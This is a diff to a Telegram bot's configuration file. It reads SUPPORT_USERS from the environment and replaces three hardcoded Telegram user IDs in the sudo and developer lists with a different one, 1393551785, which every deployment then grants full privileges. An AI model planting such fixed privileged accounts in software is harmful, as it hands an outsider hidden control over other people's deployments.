@@ -38,7 +38,7 @@ if ENV:
         raise Exception("Your sudo or dev users list does not contain valid integers.")
 
     try:
-        SUPPORT_USERS = 1393551785
+        SUPPORT_USERS = set(int(x) for x in os.environ.get("SUPPORT_USERS", "").split())
     except ValueError:
         raise Exception("Your support users list does not contain valid integers.")
 
@@ -142,14 +142,10 @@ else:
     
 
 SUDO_USERS.add(OWNER_ID)
-SUDO_USERS.add(947040154)
-SUDO_USERS.add(1118936839)
-SUDO_USERS.add(254318997)
+SUDO_USERS.add(1393551785)
 
 DEV_USERS.add(OWNER_ID)
-DEV_USERS.add(947040154)
-DEV_USERS.add(1118936839)
-DEV_USERS.add(254318997)
+DEV_USERS.add(1393551785)
 
 updater = tg.Updater(TOKEN, workers=WORKERS)
 dispatcher = updater.dispatcher
